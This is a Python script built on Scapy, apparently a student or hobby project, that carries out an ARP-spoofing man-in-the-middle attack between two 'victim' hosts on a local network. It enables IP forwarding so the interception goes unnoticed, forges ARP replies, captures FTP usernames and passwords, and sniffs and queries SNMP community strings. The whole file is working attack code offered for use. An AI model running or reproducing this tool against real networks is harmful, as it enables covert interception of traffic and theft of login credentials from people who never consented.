from scapy.all import *
import sys
import os
import asn1
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)

print("\n\n    -------------------WELCOME TO SCAPY AS MITM---------------------")
print("     ----------------------Ritz & TheGX 2020----------------------\n\n")
print("   Before: \n")
print("         ____________                        ____________")
print("        |  victim 1  |--------------------->|  victim 2  |")
print("         ____________ <--------------------- ____________\n")
print("   After: \n")
print("         ____________              _______             ____________")
print("        |  victim 1  |----------->|  you  |---------->|  victim 2  |")
print("         ____________ <----------- _______ <---------- ____________\n")

usersFTP=['']
passwordsFTP=['']

def getMAC(IP, interface):

    conf.verb=0
    ans, unans = srp(Ether( dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=10, iface=interface, inter=0.1) 
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
def doTheMess(victim_1ip, victim_2ip, victim1Mac, victim2Mac):

    send(ARP(op=2, pdst=victim_1ip, psrc= victim_2ip, hwdst= victim1Mac)) #op=2 because it's a reply
    send(ARP(op=2, pdst=victim_2ip, psrc= victim_1ip, hwdst= victim2Mac))


def cleanMess(victim_1ip, victim_2ip, interface):

    print("\nCleaning...\n")
    victim1Mac=getMAC(victim_1ip, interface)
    victim2Mac=getMAC(victim_2ip, interface)

    send(ARP(op=2 , pdst= victim_2ip, psrc=victim_1ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim1Mac), count=7)
    send(ARP(op=2 , pdst= victim_1ip, psrc=victim_2ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim2Mac), count=7)

    try:
        os_type = input("\nIf you use linux type 1, if you use macos type 0\n")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme type of os")
        sys.exit(1)

    print("Disabling ip forwarding...\n")

    if(os_type=='0'): os.system("sudo sysctl -w net.inet.ip.forwarding=0")
    else: os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    print("Bye!")
    sys.exit(1)


def checkLogin(packet, user, password):
    try:

        if "230" in packet[Raw].load.decode('ascii'): #230 it's the code for a valid login 
            print ("\nFound successful login! : ")
            print ("\n" + str(packet[IP].dst).strip() + " sent to " + str(packet[IP].src).strip() + ":")
            print ("Username: " + user+"\n")
            print ("Password: " + password + "\n")
            return
        else:
            return
    except Exception:
        return  


def checkFTPPacket(packet):

    if(packet.haslayer(Raw)):

        data=packet[Raw].load
        data=data.decode('ascii')
    
        if "USER " in data:
            #print("found ftp user packet\n")
            usersFTP.append(data.split("USER ")[1].strip())
        elif "PASS " in data:
            #print("found ftp pass packet\n")
            passwordsFTP.append(data.split("PASS ")[1].strip())
        else:
            #print("found ftp check packet\n")
            checkLogin(packet, usersFTP[-1], passwordsFTP[-1]) #checks if previously user and pass stored is a valid login
    return


def FTPSniffer(interface, victim1Ip, victim2Ip):

    print("Starting FTP Sniffer...\n")

    try:
        #ftp uses 21 port for connection and 20 for data
        sniff(iface=interface, prn=checkFTPPacket, store=0, filter="tcp src port 21 or tcp dst port 21") #prn specifies the function to apply to a received packet and store=0 to discard them 
    except KeyboardInterrupt:
        print("Failed to init FTP sniffing. Cleaning MESS\n")
        cleanMess(victim1Ip, victim2Ip,interface)
        sys.exit(1)

    print("\nStopped FTP Sniffer....\n")
    return
def SNMPAttack():

    print("\nLet's try to get system info using snmp...\n")

    cstring=input("type community string: ") #because everthing is in asn1 :')
    ipdst=input("type ip dst: ")

    ans=sr1(IP(dst=ipdst)/UDP(dport=161)/SNMP(community=cstring,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))])))
    print(ans.show())

def checkSNMPPacket(packet):

    #decoder=asn1.Decoder()
    #decoder.start(packet[SNMP].community)
    #tag, value = decoder.read()
    #print(type(packet[SNMP].community)
    print("Ip dst: "+packet[IP].dst )
    print("Community string: ")
    packet[SNMP].community.show()
    print("OID: ")
    packet[SNMPvarbind].oid.show()
    print("OID value: ")
    packet[SNMPvarbind].value.show()

    print("\n Type ctr-c to do more than sniffing")
    return


def SNMPSniffer(interface,victim1Ip, victim2Ip):

    print("Starting SNMP Sniffer...\n")

    try:
       
        sniff(iface=interface,prn=checkSNMPPacket, store=0,filter="udp src port 161 or udp dst port 161") #prn specifies the function to apply to a received packet and store=0 to discard them
        SNMPAttack()
    except KeyboardInterrupt:
        print("Failed to init FTP sniffing. Cleaning MESS\n")
        cleanMess(victim1Ip, victim2Ip,interface)
        sys.exit(1)

    return


def chooseAttack(interface, victim1Ip, victim2Ip):

    print("Which type of communication you want to sniff? (and maybe do more...)\n")


    try:
        typeOfAttack=input("\nPress 1 for FTP, 2 for SNMP and 3 for Telnet\n")
        
        if(typeOfAttack=='1'):
            FTPSniffer(interface, victim1Ip, victim2Ip)
        if(typeOfAttack=='2'):
            SNMPSniffer(interface, victim1Ip, victim2Ip)

    except KeyboardInterrupt:
        print("Stop typing random commands and gimme number\n")
        cleanMess(victim1Ip, victim2Ip, interface)
        sys.exit(1)



def MITM():

    #cleanMess("192.168.109.122", "192.168.109.147", "ens18")
    #sys.exit(1)
    #we start by ping broadcasting our entire LAN to fill the arp table
    #so we can know the IP and MAC address of all hosts
    try:
        #IpBroadcast= input("Type the broadcast IP: ") # TODO: automatic
        interface = input("Type the interface name: ")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme IP broadcast")
        sys.exit(1)

    #ping_command = "ping -b {} -c 10".format(IpBroadcast)
    #os.system(ping_command)

    #os.system("sleep 5")
    #print("\n\n\nAvailable hosts: \n")

    #arp_command = "arp -i {} -a".format(interface)
    #os.system(arp_command)
    # getting info victim

    try:
        victim_1ip= input("\nType victim 1 IP:")
        victim_2ip= input("\nType victim 2 IP:")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme victims'ip")
        sys.exit(1)

    victim1Mac=getMAC(victim_1ip, interface)
    victim2Mac=getMAC(victim_2ip, interface)
    #allowing ip forwarding since the attacker must work in such a way the victims don't know they are being attacked

    try:
        os_type = input("\nIf you use linux type 1, if you use macos type 0\n")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme type of os")
        sys.exit(1)

    print("\nEnabling ip forwarding...\n")

    if(os_type=='0'): os.system("sudo sysctl -w net.inet.ip.forwarding=1")
    else: os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


    print("\nDoing the mess...\n")

    doTheMess(victim_1ip, victim_2ip,victim1Mac, victim2Mac)

    chooseAttack(interface, victim_1ip, victim_2ip)
   
  
    try:
        input("\nType control-c to escape\n")
    except KeyboardInterrupt:
        cleanMess(victim_1ip, victim_2ip, interface)
        pass
            

MITM()
